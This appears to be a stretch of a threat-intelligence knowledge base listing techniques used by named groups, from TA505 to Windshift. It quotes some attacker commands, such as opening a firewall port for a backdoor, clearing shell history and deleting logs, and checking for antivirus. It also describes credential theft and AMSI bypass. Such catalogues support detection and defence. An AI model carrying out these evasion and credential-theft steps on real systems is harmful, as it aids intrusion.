TA505 has deployed payloads that use Windows API calls on a compromised host.
TA505 has used TinyMet to enumerate members of privileged groups. TA505 has also run &lt;code&gt;net group /domain&lt;/code&gt;.
TA505 has used PowerShell to download and execute malware and reconnaissance scripts.
TA505 has leveraged &lt;code&gt;rundll32.exe&lt;/code&gt; to execute malicious DLLs.
TA505 has used UPX to obscure malicious code.
TA505 has used spearphishing emails with malicious attachments to initially compromise victims.
TA505 has sent spearphishing emails containing malicious links.
TA505 has used a variety of tools in their operations, including AdFind, BloodHound, Mimikatz, and PowerSploit.
TA505 has staged malware on actor-controlled domains.
TA505 has used VBS for code execution.
TA505 has used HTTP to communicate with C2 nodes.
TA505 has executed commands using &lt;code&gt;cmd.exe&lt;/code&gt;.
TA551 has used obfuscated variable names in a JavaScript configuration file.
TA551 has used a DGA to generate URLs from executed macros.
TA551 has used spoofed company emails that were acquired from email clients on previously infected hosts to target other individuals.
TA551 has retrieved DLLs and installer binaries for malware execution from C2.
TA551 has prompted users to enable macros within spearphishing attachments to install malware.
TA551 has masked malware DLLs as dat and jpg files.
TA551 has used mshta.exe to execute malicious payloads.
TA551 has used regsvr32.exe to load malicious DLLs.
TA551 has used rundll32.exe to load malicious DLLs.
TA551 has sent spearphishing attachments with password protected ZIP files.
TA551 has used encoded ASCII text for initial C2 communications.
TA551 has hidden encoded data for malware DLLs in a PNG.
TA551 has used HTTP for C2 communications.
TA551 has used &lt;code&gt;cmd.exe&lt;/code&gt; to execute commands.
TeamTNT has used an IRC bot for C2 communications.
TeamTNT has cleared command history with &lt;code&gt;history -c&lt;/code&gt;.
TeamTNT has removed system logs from &lt;code&gt;/var/log/syslog&lt;/code&gt;.
TeamTNT has leveraged AWS CLI to enumerate cloud environments with compromised credentials.
TeamTNT has queried the AWS instance metadata service for credentials.
TeamTNT executed Hildegard through the kubelet API run command and by executing commands on running containers.
TeamTNT has checked for running containers with &lt;code&gt;docker ps&lt;/code&gt; and for specific container names with &lt;code&gt;docker inspect&lt;/code&gt;. TeamTNT has also searched for Kubernetes pods running in a local network.
TeamTNT has searched for unsecured AWS credentials and Docker API credentials.
TeamTNT has used a script that decodes a Base64-encoded version of WeaveWorks Scope.
TeamTNT has deployed different types of containers into victim environments to facilitate execution. TeamTNT has also transferred cryptocurrency mining software to Kubernetes clusters discovered within local IP address ranges.
TeamTNT has disabled &lt;code&gt;iptables&lt;/code&gt;.
TeamTNT has disabled and uninstalled security tools such as Alibaba, Tencent, and BMC cloud monitoring agents on cloud-based infrastructure.
TeamTNT has obtained domains to host their payloads.
TeamTNT has encrypted its binaries via AES and encoded files using Base64.
TeamTNT has deployed privileged containers that mount the filesystem of victim machine.
TeamTNT has sent locally staged files with collected credentials to C2 servers using cURL.
TeamTNT has used open-source tools such as Weave Scope to target exposed Docker API ports and gain initial access to victim environments. TeamTNT has also targeted exposed kubelets for Kubernetes environments.
TeamTNT has used a payload that removes itself after running. TeamTNT also has deleted locally staged files for collecting credentials or scan results for local IP addresses after exfiltrating them.
TeamTNT has used a script that checks `/proc/*/environ` for environment variables related to AWS.
TeamTNT has the &lt;code&gt;curl&lt;/code&gt; and &lt;code&gt;wget&lt;/code&gt; commands as well as batch scripts to download new tools.
TeamTNT has modified the permissions on binaries with &lt;code&gt;chattr&lt;/code&gt;.
TeamTNT has created local privileged users on victim machines.
TeamTNT has aggregated collected credentials in text files before exfiltrating.
TeamTNT has relied on users to download and execute malicious Docker images.
TeamTNT has developed custom malware such as Hildegard.
TeamTNT has disguised their scripts with docker-related file names.
TeamTNT has replaced .dockerd and .dockerenv with their own scripts and cryptocurrency mining software.
TeamTNT has used masscan to search for open Docker API ports and Kubernetes clusters. TeamTNT has also used malware that utilizes zmap and zgrab to search for vulnerable services in cloud environments.
TeamTNT has searched for attached VGA devices using lspci.
TeamTNT has executed PowerShell commands in batch scripts.
TeamTNT has searched for unsecured SSH keys.
TeamTNT has searched for rival malware and removes it if found. TeamTNT has also searched for running processes containing the strings aliyun or liyun to identify machines running Alibaba Cloud Security tools.
TeamTNT has added batch scripts to the startup folder.
TeamTNT has established tmate sessions for C2 communications.
TeamTNT has deployed XMRig Docker images to mine cryptocurrency. TeamTNT has also infected Docker containers and Kubernetes clusters with XMRig, and used RainbowMiner and lolMiner for mining cryptocurrency.
TeamTNT has used rootkits such as the open-source Diamorphine rootkit and their custom bots to hide cryptocurrency mining activities on the machine.
TeamTNT has used SSH to connect back to victim machines. TeamTNT has also used SSH to transfer tools and payloads onto victim hosts and execute them.
TeamTNT has added RSA keys in &lt;code&gt;authorized_keys&lt;/code&gt;.
TeamTNT has scanned specific lists of target IP addresses.
TeamTNT has searched for security products on infected machines.
TeamTNT has used UPX and Ezuri packer to pack its binaries.
TeamTNT has searched for system version, architecture, disk partition, logical volume, and hostname information.
TeamTNT has enumerated the host machine’s IP address.
TeamTNT has run &lt;code&gt;netstat -anp&lt;/code&gt; to search for rival malware connections. TeamTNT has also used `libprocesshider` to modify &lt;code&gt;/etc/ld.so.preload&lt;/code&gt;.
TeamTNT has searched for services such as Alibaba Cloud Security's aliyun service and BMC Helix Cloud Security's bmc-agent service in order to disable them.
TeamTNT has created system services to execute cryptocurrency mining software.
TeamTNT has established persistence through the creation of a cryptocurrency mining system service using &lt;code&gt;systemctl&lt;/code&gt;.
TeamTNT has used shell scripts for execution.
TeamTNT has uploaded backdoored Docker images to Docker Hub.
TeamTNT has scanned for vulnerabilities in IoT devices and other related resources such as the Docker API.
TeamTNT has the `curl` command to send credentials over HTTP and the `curl` and `wget` commands to download new software. TeamTNT has also used a custom user agent HTTP header in shell scripts.
TeamTNT has leveraged iplogger.org to send collected data back to C2.
TeamTNT has used batch scripts to download tools and executing cryptocurrency miners.
TeamTNT has used malware that adds cryptocurrency miners as a service.
The White Company has taken advantage of a known vulnerability in Microsoft Word (CVE 2012-0158) to execute code.
The White Company has the ability to delete its malware entirely from the target system.
The White Company has used phishing lure documents that trick users into opening them and infecting their computers.
The White Company has checked for specific antivirus products on the target’s computer, including Kaspersky, Quick Heal, AVG, BitDefender, Avira, Sophos, Avast!, and ESET.
The White Company has obfuscated their payloads through packing.
The White Company has sent phishing emails with malicious Microsoft Word attachments to victims.
The White Company has checked the current date on the victim system.
Threat Group-1314 actors used compromised domain credentials for the victim's endpoint management platform, Altiris, to move laterally.
Threat Group-1314 actors mapped network drives using &lt;code&gt;net use&lt;/code&gt;.
Threat Group-1314 actors used a victim's endpoint management platform, Altiris, for lateral movement.
Threat Group-1314 actors spawned shells on remote systems on a victim network to execute commands.
Threat Group-3390 has used RAR to compress, encrypt, and password-protect files prior to exfiltration.
Threat Group-3390 actors use at to schedule tasks to run self-extracting RAR archives, which install HTTPBrowser or PlugX on other victims on a network.
Threat Group-3390 ran a command to compile an archive of file types of interest from the victim user's directories.
A Threat Group-3390 tool can use a public UAC bypass method to elevate privileges.
Threat Group-3390 has obtained stolen valid certificates, including from VMProtect and the Chinese instant messaging application Youdu, for their operations.
Threat Group-3390 has compromised the Able Desktop installer to gain access to victim's environments.
Threat Group-3390 has performed DLL search order hijacking to execute their payload.
Threat Group-3390 has used DLL side-loading, including by using legitimate Kaspersky antivirus variants as well as `rc.exe`, a legitimate Microsoft Resource Compiler.
Threat Group-3390 actors have split RAR files for exfiltration into parts.
Threat Group-3390 ran a command to compile an archive of file types of interest from the victim user's directories.
During execution, Threat Group-3390 malware deobfuscates and decompresses code that was encoded with Metasploit’s shikata_ga_nai encoder as well as compressed with LZNT1 compression.
Threat Group-3390 has used appcmd.exe to disable logging on a victim server.
Threat Group-3390 has registered domains for C2.
Threat Group-3390 has extensively used strategic web compromises to target victims.
Threat Group-3390 has embedded malicious code into websites to screen a potential victim's IP address and then exploit their browser if they are of interest.
A Threat Group-3390 tool can encrypt payloads using XOR. Threat Group-3390 malware is also obfuscated using Metasploit’s shikata_ga_nai encoder as well as compressed with LZNT1 compression.
Threat Group-3390 has exfiltrated stolen data to Dropbox.
Threat Group-3390 has exploited the Microsoft SharePoint vulnerability CVE-2019-0604 and CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065 in Exchange Server.
Threat Group-3390 has exploited CVE-2018-0798 in Equation Editor.
Threat Group-3390 has used CVE-2014-6324 and CVE-2017-0213 to escalate privileges.
Threat Group-3390 has exploited MS17-010 to move laterally to other systems on the network.
Threat Group-3390 actors look for and use VPN profiles during an operation to access the network using external VPN services. Threat Group-3390 has also obtained OWA account credentials during intrusions that it subsequently used to attempt to regain access when evicted from a victim network.
Threat Group-3390 has deleted existing logs and exfiltrated file archives from a victim.
Threat Group-3390 has downloaded additional malware and tools, including through the use of `certutil`, onto a compromised host .
Threat Group-3390 actors installed a credential logger on Microsoft Exchange servers. Threat Group-3390 also leveraged the reconnaissance framework, ScanBox, to capture keystrokes.
Threat Group-3390 actors have used gsecdump to dump credentials. They have also dumped credentials from domain controllers.
Threat Group-3390 actors have used a modified version of Mimikatz called Wrapikatz to dump credentials. They have also dumped credentials from domain controllers.
Threat Group-3390 has used &lt;code&gt;net user&lt;/code&gt; to conduct internal discovery of systems.
Threat Group-3390 has locally staged encrypted archives for later exfiltration efforts.
Threat Group-3390 has lured victims into opening malicious files containing malware.
A Threat Group-3390 tool has created new Registry keys under `HKEY_CURRENT_USER\Software\Classes\` and `HKLM\SYSTEM\CurrentControlSet\services`.
Threat Group-3390 actors use the Hunter tool to conduct network service discovery for vulnerable systems.
Threat Group-3390 has detached network shares after exfiltrating files, likely to evade detection.
Threat Group-3390 obtained a KeePass database from a compromised host.
Threat Group-3390 has used PowerShell for execution.
A Threat Group-3390 tool can spawn `svchost.exe` and inject the payload into that process.
A Threat Group-3390 tool can read and decrypt stored Registry values.
Threat Group-3390's malware can add a Registry key to `Software\Microsoft\Windows\CurrentVersion\Run` for persistence.
Threat Group-3390 has moved staged encrypted archives to Internet-facing servers that had previously been compromised with China Chopper prior to exfiltration.
Threat Group-3390 has used the &lt;code&gt;net view&lt;/code&gt; command.
Threat Group-3390 actors have used gsecdump to dump credentials. They have also dumped credentials from domain controllers.
Threat Group-3390 has packed malware and tools, including using VMProtect.
Threat Group-3390 has used e-mail to deliver malicious attachments to victims.
Threat Group-3390 actors use NBTscan to discover vulnerable systems.
Threat Group-3390 has used `net use` and `netstat` to conduct internal discovery of systems. The group has also used `quser.exe` to identify existing RDP sessions on a victim.
Threat Group-3390 has used `whoami` to collect system user information.
Threat Group-3390 has obtained and used tools such as Impacket, pwdump, Mimikatz, gsecdump, NBTscan, and Windows Credential Editor.
Threat Group-3390 has compromised third party service providers to gain access to victim's environments.
Threat Group-3390 has hosted malicious payloads on Dropbox.
Threat Group-3390 has staged tools, including gsecdump and WCE, on previously compromised websites.
Threat Group-3390 actors obtain legitimate credentials using a variety of methods and use them to further lateral movement on victim networks.
Threat Group-3390 malware has used HTTP for C2.
Threat Group-3390 has used a variety of Web shells.
Threat Group-3390 has used command-line interfaces for execution.
A Threat Group-3390 tool can use WMI to execute a binary.
Threat Group-3390 has used WinRM to enable remote execution.
Threat Group-3390's malware can create a new service, sometimes naming it after the config information, to gain persistence.
Thrip has used WinSCP to exfiltrate data from a targeted organization over FTP.
Thrip leveraged PowerShell to run commands to download payloads, traverse the compromised networks, and carry out reconnaissance.
Thrip used a cloud-based remote access software called LogMeIn for their attacks.
Thrip has obtained and used tools such as Mimikatz and PsExec.
ToddyCat has leveraged  xcopy, 7zip, and RAR to stage and compress collected documents prior to exfiltration.
ToddyCat has run scripts to collect documents from targeted hosts.
Prior to executing a backdoor ToddyCat  has run `cmd /c start /b netsh advfirewall firewall add rule name="SGAccessInboundRule" dir=in protocol=udp action=allow localport=49683` to allow the targeted system to receive UDP packets on port 49683.
ToddyCat has run `net user %USER% /dom` for account discovery.
ToddyCat has used compromised domain admin credentials to mount local network shares.
ToddyCat has executed `net group "domain admins" /dom` for discovery on compromised machines.
ToddyCat has used a DropBox uploader to exfiltrate stolen files.
ToddyCat has exploited the ProxyLogon vulnerability (CVE-2021-26855) to compromise Exchange Servers at multiple organizations.
ToddyCat has run scripts to enumerate recently modified documents having either a .pdf, .doc, .docx, .xls or .xlsx extension.
ToddyCat has hidden malicious scripts using `powershell.exe -windowstyle hidden`.
ToddyCat has used the name `debug.exe` for malware components.
ToddyCat has used `WinExec` to execute commands received from C2 on compromised hosts.
ToddyCat has used a passive backdoor that receives commands with UDP packets.
ToddyCat has used Powershell scripts to perform post exploit collection.
ToddyCat has run `cmd /c start /b tasklist` to enumerate processes.
ToddyCat manually transferred collected files to an exfiltration host using xcopy.
ToddyCat has used `ping %REMOTE_HOST%` for post exploit discovery.
ToddyCat has used locally mounted network shares for lateral movement through targated environments.
ToddyCat has used scheduled tasks to execute discovery commands and scripts for collection.
ToddyCat can determine is Kaspersky software is running on an endpoint by running `cmd /c wmic process where name="avp.exe"`.
ToddyCat has sent loaders configured to run Ninja as zip archives via Telegram.
ToddyCat has collected information on bootable drives including model, vendor, and serial numbers.
ToddyCat has used `netstat -anop tcp` to discover TCP connections to compromised hosts.
ToddyCat has used .bat scripts and `cmd` for execution on compromised hosts.
ToddyCat has used WMI to execute scripts for post exploit document collection.
Tonto Team abuses a legitimate and signed Microsoft executable to launch a malicious DLL.
Tonto Team has exploited Microsoft vulnerabilities, including CVE-2018-0798, CVE-2018-8174, CVE-2018-0802, CVE-2017-11882, CVE-2019-9489 CVE-2020-8468, and CVE-2018-0798 to enable execution of their delivered malicious payloads.
Tonto Team has exploited CVE-2019-0803 and MS16-032 to escalate privileges.
Tonto Team has used EternalBlue exploits for lateral movement.
Tonto Team has routed their traffic through an external server in order to obfuscate their location.
Tonto Team has downloaded malicious DLLs which served as a ShadowPad loader.
Tonto Team has used keylogging tools in their operations.
Tonto Team has used the &lt;code&gt;ShowLocalGroupDetails&lt;/code&gt; command to identify administrator, user, and guest accounts on a compromised host.
Tonto Team has relied on user interaction to open their malicious RTF documents.
Tonto Team has used tools such as NBTscan to enumerate network shares.
Tonto Team has used a variety of credential dumping tools.
Tonto Team has used PowerShell to download additional payloads.
Tonto Team has used Python-based tools for execution.
Tonto Team has delivered payloads via spearphishing attachments.
Tonto Team has used a first stage web shell after compromising a vulnerable Exchange server.
Transparent Tribe has registered domains to mimic file sharing, government, defense, and research websites for use in targeted campaigns.
Transparent Tribe has compromised domains for use in targeted malicious campaigns.
Transparent Tribe has used websites with malicious hyperlinks and iframes to infect targeted victims with Crimson, njRAT, and other malicious tools.
Transparent Tribe has set up websites with malicious hyperlinks and iframes to infect targeted victims with Crimson, njRAT, and other malicious tools.
Transparent Tribe has used dynamic DNS services to set up C2.
Transparent Tribe has dropped encoded executables on compromised hosts.
Transparent Tribe has crafted malicious files to exploit CVE-2012-0158 and CVE-2010-3333 for execution.
Transparent Tribe can hide legitimate directories and replace them with malicious copies of the same name.
Transparent Tribe has used weaponized documents in e-mail to compromise targeted systems.
Transparent Tribe has directed users to open URLs hosting malicious content.
Transparent Tribe can mimic legitimate Windows directories by using the same icons and names.
Transparent Tribe has sent spearphishing e-mails with attachments to deliver malicious payloads.
Transparent Tribe has embedded links to malicious downloads in e-mails.
Transparent Tribe has crafted VBS-based malicious documents.
Tropic Trooper has used SSL to connect to C2 servers.
Tropic Trooper has collected information automatically using the adversary's USBferry attack.
Tropic Trooper has used a copy function to automatically exfiltrate sensitive data from air-gapped systems using USB storage.
Tropic Trooper has been known to side-load DLLs using a valid version of a Windows Address Book and Windows Defender executable with one of their tools.
Tropic Trooper's backdoor has communicated to the C2 over the DNS protocol.
Tropic Trooper used shellcode with an XOR algorithm to decrypt a payload. Tropic Trooper also decrypted image files which contained a payload.
Tropic Trooper has injected a DLL backdoor into dllhost.exe and svchost.exe.
Tropic Trooper has encrypted traffic with the C2 to prevent network detection.
Tropic Trooper has encrypted configuration files.
Tropic Trooper has exfiltrated data using USB storage devices.
Tropic Trooper has executed commands through Microsoft security vulnerabilities, including CVE-2017-11882, CVE-2018-0802, and CVE-2012-0158.
Tropic Trooper has deleted dropper files on an infected system using command scripts.
Tropic Trooper has monitored files' modified time.
Tropic Trooper has created a hidden directory under &lt;code&gt;C:\ProgramData\Apple\Updates\&lt;/code&gt; and &lt;code&gt;C:\Users\Public\Documents\Flash\&lt;/code&gt;.
Tropic Trooper has used a delivered trojan to download additional files.
Tropic Trooper has used known administrator account credentials to execute the backdoor directly.
Tropic Trooper has lured victims into executing malware via malicious e-mail attachments.
Tropic Trooper has hidden payloads in Flash directories and fake installer files.
Tropic Trooper has used multiple Windows APIs including HttpInitialize, HttpCreateHttpHandle, and HttpAddUrl.
Tropic Trooper used &lt;code&gt;pr&lt;/code&gt; and an openly available tool to scan for open ports on target systems.
Tropic Trooper used &lt;code&gt;netview&lt;/code&gt; to scan target systems for shared resources.
Tropic Trooper is capable of enumerating the running processes on the system using &lt;code&gt;pslist&lt;/code&gt;.
Tropic Trooper has created shortcuts in the Startup folder to establish persistence.
Tropic Trooper has attempted to transfer USBferry from an infected USB device by copying an Autorun function to the target machine.
Tropic Trooper can search for anti-virus software running on the system.
Tropic Trooper's backdoor could list the infected system's installed software.
Tropic Trooper sent spearphishing emails that contained malicious Microsoft Office and fake installer file attachments.
Tropic Trooper has used base64 encoding to hide command strings delivered from the C2.
Tropic Trooper has used JPG files with encrypted payloads to mask their backdoor routines and evade detection.
Tropic Trooper has detected a target system’s OS version and system volume information.
Tropic Trooper has used scripts to collect the host's network topology.
Tropic Trooper has tested if the localhost network is available and other connection capability on an infected system using command scripts.
Tropic Trooper used &lt;code&gt;letmein&lt;/code&gt; to scan for saved usernames on the target system.
Tropic Trooper delivered malicious documents with the XLSX extension, typically used by OpenXML documents, but the file itself was actually an OLE (XLS) document.
Tropic Trooper has used HTTP in communication with the C2.
Tropic Trooper has started a web service in the target host and wait for the adversary to connect, acting as a web shell.
Tropic Trooper has used Windows command scripts.
Tropic Trooper has installed a service pointing to a malicious DLL dropped to disk.
Tropic Trooper has created the Registry key &lt;code&gt;HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell&lt;/code&gt; and sets the value to establish persistence.
Turla has encrypted files stolen from connected USB drives into a RAR file before exfiltration.
A Turla JavaScript backdoor has used Google Apps Script as its C2 server.
Turla may attempt to connect to systems within a victim's network using &lt;code&gt;net use&lt;/code&gt; commands and a predefined list or collection of passwords.
Turla has modified variables in kernel memory to turn off Driver Signature Enforcement after exploiting vulnerabilities that obtained kernel mode privileges.
Turla has used encryption (including salted 3DES via PowerSploit's &lt;code&gt;Out-EncryptedScript.ps1&lt;/code&gt;), random variable names, and base64 encoding to obfuscate PowerShell commands and payloads.
Turla RPC backdoors can impersonate or steal process tokens before executing commands.
Turla has used a custom .NET tool to collect documents from an organization's internal central database.
Turla RPC backdoors can upload files from victim machines.
Turla RPC backdoors can collect files from USB thumb drives.
Turla has used a custom decryption routine, which pulls key and salt values from other artifacts such as a WMI filter or PowerShell Profile, to decode encrypted PowerShell payloads.
Turla has used a AMSI bypass, which patches the in-memory amsi.dll, in PowerShell scripts to bypass Windows antimalware products.
Turla has used &lt;code&gt;net user /domain&lt;/code&gt; to enumerate domain accounts.
Turla has used &lt;code&gt;net group "Domain Admins" /domain&lt;/code&gt; to identify domain administrators.
Turla has infected victims using watering holes.
Turla has used Metasploit to perform reflective DLL injection in order to escalate privileges.
Turla has used WebDAV to upload stolen USB files to a cloud drive. Turla has also exfiltrated stolen files to OneDrive and 4shared.
Turla has exploited vulnerabilities in the VBoxDrv.sys driver to obtain kernel mode privileges.
Turla surveys a system upon check-in to discover files in specific locations on the hard disk %TEMP% directory, the current user's desktop, the Program Files directory, and Recent. Turla RPC backdoors have also searched for files matching the &lt;code&gt;lPH*.dll&lt;/code&gt; pattern.
Turla has used the Registry to store encrypted and encoded payloads.
Turla surveys a system upon check-in to discover Group Policy details using the &lt;code&gt;gpresult&lt;/code&gt; command.
Based on comparison of Gazer versions, Turla made an effort to obfuscate strings in the malware that could be used as IoCs, including the mutex name and named pipe.
Turla has used shellcode to download Meterpreter after compromising a victim.
Turla has compromised internal network systems to act as a proxy to forward traffic to C2.
Turla has used &lt;code&gt;tracert&lt;/code&gt; to check internet connectivity.
Turla has used various JavaScript-based backdoors.
Turla RPC backdoors can be used to transfer files to/from victim machines on the local network.
Turla has used &lt;code&gt;net user&lt;/code&gt; to enumerate local accounts on the system.
Turla has abused local accounts that have the same password across the victim’s network.
Turla has used &lt;code&gt;net localgroup&lt;/code&gt; and &lt;code&gt;net localgroup Administrators&lt;/code&gt; to enumerate group information, including members of the local administrators group.
Turla has used multiple backdoors which communicate with a C2 server via email attachments.
Turla has used spearphishing via a link to get users to download and run their malware.
Turla has developed its own unique malware for use in operations.
Turla has used malware obtained after compromising other threat actors, such as OilRig.
Turla has modify Registry values to store payloads.
Turla and its RPC backdoors have used APIs calls for various tasks related to subverting AMSI and accessing then executing commands through RPC and/or named pipes.
Turla has used &lt;code&gt;net accounts&lt;/code&gt; and &lt;code&gt;net accounts /domain&lt;/code&gt; to acquire password policy information.
Turla has used &lt;code&gt;fsutil fsinfo drives&lt;/code&gt; to list connected drives.
Turla has used PowerShell to execute commands/scripts, in some cases via a custom executable or code from Empire's PSInject. Turla has also used PowerShell scripts to load and execute malware in memory.
Turla has used PowerShell profiles to maintain persistence on an infected machine.
Turla surveys a system upon check-in to discover running processes using the &lt;code&gt;tasklist /v&lt;/code&gt; command. Turla RPC backdoors have also enumerated processes associated with specific open ports or named pipes.
Turla has also used PowerSploit's &lt;code&gt;Invoke-ReflectivePEInjection.ps1&lt;/code&gt; to reflectively load a PowerShell payload into a random process on the victim system.
Turla RPC backdoors have included local UPnP RPC proxies.
Turla has used IronPython scripts as part of the IronNetInjector toolchain to drop payloads.
Turla surveys a system upon check-in to discover information in the Windows Registry with the &lt;code&gt;reg query&lt;/code&gt; command. Turla has also retrieved PowerShell payloads hidden in Registry keys as well as checking keys associated with null session named pipes .
A Turla Javascript backdoor added a local_update_check value under the Registry key &lt;code&gt;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt; to establish persistence. Additionally, a Turla custom executable containing Metasploit shellcode is saved to the Startup folder to gain persistence.
Turla surveys a system upon check-in to discover remote systems on a local network using the &lt;code&gt;net view&lt;/code&gt; and &lt;code&gt;net view /DOMAIN&lt;/code&gt; commands. Turla has also used &lt;code&gt;net group "Domain Computers" /domain&lt;/code&gt;, &lt;code&gt;net group "Domain Controllers" /domain&lt;/code&gt;, and &lt;code&gt;net group "Exchange Servers" /domain&lt;/code&gt; to enumerate domain computers, including the organization's DC and Exchange Server.
Turla used &lt;code&gt;net use&lt;/code&gt; commands to connect to lateral systems within a network.
Turla has obtained information on security software, including security logging information that may indicate whether their malware has been detected.
Turla has used compromised servers as infrastructure.
Turla attempted to trick targets into clicking on a link featuring a seemingly legitimate domain from Adobe.com to download their malware and gain initial access.
Turla surveys a system upon check-in to discover operating system configuration details using the &lt;code&gt;systeminfo&lt;/code&gt; and &lt;code&gt;set&lt;/code&gt; commands.
Turla surveys a system upon check-in to discover network configuration details using the &lt;code&gt;arp -a&lt;/code&gt;, &lt;code&gt;nbtstat -n&lt;/code&gt;, &lt;code&gt;net config&lt;/code&gt;, &lt;code&gt;ipconfig /all&lt;/code&gt;, and &lt;code&gt;route&lt;/code&gt; commands, as well as NBTscan. Turla RPC backdoors have also retrieved registered RPC interface information from process memory.
Turla surveys a system upon check-in to discover active local network connections using the &lt;code&gt;netstat -an&lt;/code&gt;, &lt;code&gt;net use&lt;/code&gt;, &lt;code&gt;net file&lt;/code&gt;, and &lt;code&gt;net session&lt;/code&gt; commands. Turla RPC backdoors have also enumerated the IPv4 TCP connection table via the &lt;code&gt;GetTcpTable2&lt;/code&gt; API call.
Turla surveys a system upon check-in to discover running services and associated processes using the &lt;code&gt;tasklist /svc&lt;/code&gt; command.
Turla surveys a system upon check-in to discover the system time by using the &lt;code&gt;net time&lt;/code&gt; command.
Turla has obtained and customized publicly-available tools like Mimikatz.
Turla has used the VPS infrastructure of compromised Iranian threat actors.
Turla has used VBS scripts throughout its operations.
Turla has used HTTP and HTTPS for C2 communications.
Turla has used legitimate web services including Pastebin, Dropbox, and GitHub for C2 communications.
Turla has created web accounts including Dropbox and GitHub for C2 and document exfiltration.
Turla has frequently used compromised WordPress sites for C2 infrastructure.
Turla RPC backdoors have used cmd.exe to execute commands.
Turla has gathered credentials from the Windows Credential Manager tool.
Turla has used WMI event filters and consumers to establish persistence.
Turla established persistence by adding a Shell value under the Registry key &lt;code&gt;HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon&lt;/code&gt;.
Volatile Cedar has targeted publicly facing web servers, with both automatic and manual vulnerability discovery.
Volatile Cedar can deploy additional tools.
Volatile Cedar has performed vulnerability scans of the target server.
Volatile Cedar can inject web shell code into a server.
Volatile Cedar has used DirBuster and GoBuster to brute force web directories and DNS subdomains.
Volt Typhoon has archived the ntds.dit database as a multi-volume password-protected archive with 7-Zip.
Volt Typhoon have inspected server logs to remove their IPs.
Volt Typhoon has attempted to obtain credentials from OpenSSH, realvnc, and PuTTY.
Volt Typhoon has staged collected data in password-protected archives.
Volt Typhoon has stolen the Active Directory database from targeted environments and used Wevtutil to extract event log information.
Volt Typhoon has run `net group /dom` and `net group "Domain Admins" /dom` in compromised environments for account discovery.
Volt Typhoon has used compromised domain accounts to authenticate to devices on compromised networks.
Volt Typhoon has run `net group` in compromised environments to discover domain groups.
Volt Typhoon gained initial access through exploitation of CVE-2021-40539 in internet-facing ManageEngine ADSelfService Plus servers.
Volt Typhoon has run `rd /S` to delete their working directories and files.
Volt Typhoon has used the built-in netsh `port proxy` command to create proxies on compromised systems to facilitate access.
Volt Typhoon has attempted to access hashed credentials from the LSASS process memory space.
Volt Typhoon has copied web shells between servers in targeted environments.
Volt Typhoon has saved stolen files including the ntds.dit database and the `SYSTEM` and `SECURITY` Registry hives locally to the `C:\Windows\Temp\` directory.
Volt Typhoon has run `net localgroup administrators` in compromised environments to enumerate accounts.
Volt Typhoon has used `wevtutil.exe` and the PowerShell command `Get-EventLog security` to enumerate Windows logs to search for successful logons.
Volt Typhoon has appended copies of the ntds.dit database with a .gif file extension.
Volt Typhoon has used legitimate looking filenames for compressed copies of the ntds.dit database and used names including cisco_up.exe, cl64.exe, vm3dservice.exe, watchdogd.exe, Win.exe, WmiPreSV.exe, and WmiPrvSE.exe for the Earthworm and Fast Reverse Proxy tools.
Volt Typhoon has used ntds.util to create domain controller installation media containing usernames and password hashes.
Volt Typhoon has compromised small office and home office (SOHO) network edge devices, many of which were located in the same geographic area as the victim, to proxy network traffic.
Volt Typhoon has used PowerShell including for remote system discovery.
Volt Typhoon has enumerated running processes on targeted systems.
Volt Typhoon has used compromised devices and customized versions of open source tools  such as Fast Reverse Proxy (FRP), Earthworm, and Impacket to proxy network traffic.
Volt Typhoon has queried the Registry on compromised systems, `reg query hklm\software\`, for information on installed software.
Volt Typhoon has used multiple methods, including Ping, to enumerate systems on compromised networks.
Volt Typhoon has used compromised PRTG servers from other organizations for C2.
Volt Typhoon has queried the Registry on compromised systems for information on installed software.
Volt Typhoon has used a version of the Awen web shell that employed AES encryption and decryption for C2 communications.
Volt Typhoon has run system checks to determine if they were operating in a virtualized environment.
Volt Typhoon has discovered file system types, drive names, size, and free space on compromised systems.
Volt Typhoon has executed multiple commands to enumerate network topology and settings including  `ipconfig`, `netsh interface firewall show all`, and `netsh interface portproxy show all`.
Volt Typhoon has used `netstat -ano` on compromised hosts to enumerate network connections.
Volt Typhoon has executed the PowerShell command `Get-EventLog security -instanceid 4624` to identify associated user and computer account names.
Volt Typhoon has used customized versions of open-source tools for C2.
Volt Typhoon has used webshells, including ones named AuditReport.jspx and iisstart.aspx, in compromised environments.
Volt Typhoon has used the Windows command line to perform hands-on-keyboard activities in targeted environments including for discovery.
Volt Typhoon has leveraged WMIC including for execution and remote system discovery.
WIRTE has used Base64 to decode malicious VBS script.
WIRTE has downloaded PowerShell code from the C2 server to be executed.
WIRTE has attempted to lure users into opening malicious MS Word and Excel files to execute malicious payloads.
WIRTE has named a first stage dropper `Kaspersky Update Agent` in order to appear legitimate.
WIRTE has used HTTPS over ports 2083 and 2087 for C2.
WIRTE has used PowerShell for script execution.
WIRTE has used `regsvr32.exe` to trigger the execution of a malicious script.
WIRTE has sent emails to intended victims with malicious MS Word and Excel attachments.
WIRTE has obtained and used Empire for post-exploitation activities.
WIRTE has used VBScript  in its operations.
WIRTE has used HTTP for network communication.
Whitefly has used a simple remote shell tool that will call back to the C2 server and wait for commands.
Whitefly has used search order hijacking to run the loader Vcrodat.
Whitefly has encrypted the payload used for C2.
Whitefly has used an open-source tool to exploit a known Windows privilege escalation vulnerability (CVE-2016-0051) on unpatched computers.
Whitefly has the ability to download additional tools from the C2.
Whitefly has used Mimikatz to obtain credentials.
Whitefly has used malicious .exe or .dll files disguised as documents or images.
Whitefly has named the malicious DLL the same name as DLLs belonging to legitimate software from various security vendors.
Whitefly has obtained and used tools such as Mimikatz.
Windigo has used a Perl script for information gathering.
Windigo has used a script to gather credentials in files left on disk by OpenSSH backdoors.
Windigo has distributed Windows malware via drive-by downloads.
Windigo has used a script to check for the presence of files created by OpenSSH backdoors.
Windigo has delivered a generic Windows proxy Win32/Glubteta.M. Windigo has also used multiple reverse proxy chains as part of their C2 infrastructure.
Windigo has used a script to detect installed software on targeted systems.
Windigo has used a script to detect which Linux distribution and version is currently installed on the system.
Windshift has used compromised websites to register custom URL schemes on a remote system.
Windshift has used tools to deploy additional payloads to compromised hosts.
Windshift has used revoked certificates to sign malware.
Windshift has used e-mail attachments to lure victims into executing malicious code.
Windshift has used links embedded in e-mails to lure victims into executing malicious code.
